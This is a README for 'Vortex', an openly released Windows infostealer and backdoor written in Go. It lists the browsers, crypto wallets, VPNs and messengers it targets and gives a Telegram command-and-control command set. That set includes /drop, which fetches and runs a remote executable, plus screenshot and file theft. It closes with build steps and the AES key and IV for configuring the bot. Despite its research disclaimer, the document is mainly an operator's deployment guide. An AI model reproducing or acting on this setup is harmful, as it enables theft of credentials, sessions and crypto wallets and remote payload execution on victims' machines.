## Vortex InfoStealer

This is an infostealer malware written in Golang that I have wrote long time ago for some researches and I have decided to release the code for researching.

## Overview

Vortex is a Windows-focused information-stealing implant with an operator-controlled commands. It is designed to operate as both a data exfiltration tool and a flexible backdoor: it can enumerate and manage connected clients, collect high-value artifacts (browser data, wallet extensions, messaging and desktop app data, file collections, screenshots), and receive updated components from an operator. The implant emphasizes stealth and persistence through extensive anti-analysis and AV-evasion techniques.
The data will be delivered via Telegram bot and it will be controlled via Telegram bot commands.

## Disclaimer

This project is provided **for educational and research purposes only**.
It is intended to help **security researchers and defenders** understand, analyze, and improve malware detection.
Any misuse of this code for illegal or unethical activity **is strictly prohibited**.
The author assumes **no responsibility** for any damage or consequences caused by improper use.

## Key capabilities

- **C2 Capabilities**: The implant supports remote status checks and enumeration of connected clients to identify active or available victims. It can instruct clients to perform actions such as retrieving screenshots, collecting files (images/documents), toggling data collection/upload behavior, and receiving upgraded binaries.

- **Payload distribution/backdoor**: The vortex implant can accept and execute secondary payloads supplied by the operator (documented here as a capability only).

- **Data Stealing**: Collecting much possible data include browser profiles, browser extensions (notably crypto wallet extensions), VPN client config files, messenger applications, and common desktop tools that may store credentials or sessions.

- **Evasion & anti-analysis**: Vortex implant contains sandbox/VM detection, anti-debugging techniques, heavy binary obfuscation and packing, and mechanisms intended to frustrate static and dynamic analysis.

- **Endpoint interference**: Capabilities to tamper with or disable endpoint protections have been observed or claimed; defenders should treat attempts to modify security tooling as high-risk indicators.

## Primary targets and affected software categories

> **(Listed for defensive prioritization; useful for threat-hunting and AV signature tuning.)**

| Browsers     | VPN       | CryptoWallets | CryptoWallets Extensions | Messengers | Others     |
| ------------ | --------- | ------------- | ------------------------ | ---------- | ---------- |
| 7Star        | NordVPN   | Zcash         | Tronlink                 | Discord    | FileZilla  |
| Cent         | ProtonVPN | Armory        | NiftyWallet              | Telegram   | Putty      |
| Chrome       | OpenVPN   | Exodus        | Metamask                 | Element    | Teamviewer |
| Chromium     |           | Ethereum      | MathWallet               | Signal     | WinSCP     |
| Edge         |           | Electrum      | Coinbase                 | Skype      | Steam      |
| QQBrowser    |           | Atomic        | BinanceChain             | Whatsapp   | Uplay      |
| Opera        |           | Guarda        | BraveWallet              |            |            |
| OperaNeon    |           | Coinomi       | GuardaWallet             |            |            |
| Amigo        |           | Jaxx          | EqualWallet              |            |            |
| Chedot       |           | Binance       | JaxxxLiberty             |            |            |
| Brave        |           |               | BitAppWallet             |            |            |
| ComodoDragon |           |               | iWallet                  |            |            |
| CocCoc       |           |               | Wombat                   |            |            |
| AVGBrowser   |           |               | YoroiWallet              |            |            |
| Slimjet      |           |               | TonCrystal               |            |            |
| Sputnik      |           |               | Coin98Wallet             |            |            |
| Vivaldi      |           |               | Phantom                  |            |            |
| Firefox      |           |               | GuildWallet              |            |            |
| Waterfox     |           |               | Oxygen                   |            |            |
| Palemoon     |           |               | LiqualityWallet          |            |            |
| Icecat       |           |               | Iconex                   |            |            |
|              |           |               | Mobox                    |            |            |
|              |           |               | XinPay                   |            |            |
|              |           |               | Sollet                   |            |            |
|              |           |               | Slope                    |            |            |
|              |           |               | Starcoin                 |            |            |
|              |           |               | Swash                    |            |            |
|              |           |               | Finnie                   |            |            |
|              |           |               | Keplr                    |            |            |
|              |           |               | Crocobit                 |            |            |
|              |           |               | AtomWallet               |            |            |
|              |           |               | KardiaChain              |            |            |
|              |           |               | TerraStation             |            |            |
|              |           |               | BoltX                    |            |            |
|              |           |               | RoninWallet              |            |            |
|              |           |               | XdefiWallet              |            |            |
|              |           |               | Nami                     |            |            |
|              |           |               | MultiversXDeFiWallet     |            |            |
|              |           |               | PaliWallet               |            |            |
|              |           |               | TempleTezosWallet        |            |            |
|              |           |               | ExodusWeb3Wallet         |            |            |

## Telegram Bot Commands

| Bot Command                                                 | Description                                                                                                                                     |
| ----------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
| /check `<ZOMBIE_ID>`                                        | Checks if the zombie host is online                                                                                                             |
| /check_all                                                  | Checks all the available zombies and who is connected                                                                                           |
| /drop `<ZOMBIE_ID>` `<DOWNLOAD_LINK>` `<EXE_NAME>` `<PATH>` | Download and execute an exe file on specific zombie EX: /drop 11111-22222-3333-4444 http://file.io/payload.exe payload.exe                      |
| /screenshot `<ZOMBIE_ID>`                                   | Take screenshot of zombie desktop screen                                                                                                        |
| /get_data `<ZOMBIE_ID>` `<DATATYPE>` `<PATH>`               | Collect (images/documents) data                                                                                                                 |
| /disable_upload `<ZOMBIE_ID>`                               | Disable data dumped from uploading of specific zombie                                                                                           |
| /enable_upload`<ZOMBIE_ID>`                                 | Enable data uploading of specific zombie (Enabled by default)                                                                                   |
| /upgrade `<ZOMBIE_ID>` `<DOWNLOAD_LINK>` `<IMPLANT_NAME>`   | Upgrades the current agathos implant with newer updated version EX: /upgrade 11111-22222-3333-4444 https://file.io/agathos.exe chrome_patch.exe |

## Requirements to compile

It needs to be compiled on linux machine, any type of linux distribution is compatible as long as it have Go packages and mingw compilers. I will use ubuntu here as an example.

- Install the required packages.
```bash
sudo apt install golang gcc-mingw-w64 make
```

- Start to compile (`release_x64` , `release_x32`, `debug`)
```bash
make release_x64
```

## Telegram Configuration

Start to make telegram bot using @BotFather and get the telegram token and chat ID.

Then encrypt the token and the chat ID with AES Encryption method "CBC Mode" with the following Cipher Key and IV.

- Key
```c
0xD5, 0x03, 0xE6, 0xE0, 0x63, 0x52, 0x7C,
0xB6, 0x24, 0xFE, 0x03, 0x63, 0xFF, 0xF9,
0xB3, 0xBD, 0x20, 0x94, 0x1C, 0xAF, 0x70,
0x84, 0x92, 0xB6, 0x90, 0x5F, 0x66, 0x43,
0x4D, 0xCA, 0x72, 0x77
```
- IV
```c
0x27, 0xD8, 0xB1, 0xF0, 0xDB, 0x3C, 0xAB,
0x3E, 0x20, 0x20, 0x21, 0x56, 0xBA, 0x1B,
0x37, 0x13
```

And then encode the RAW output with base64 and place it in `main.go` file.
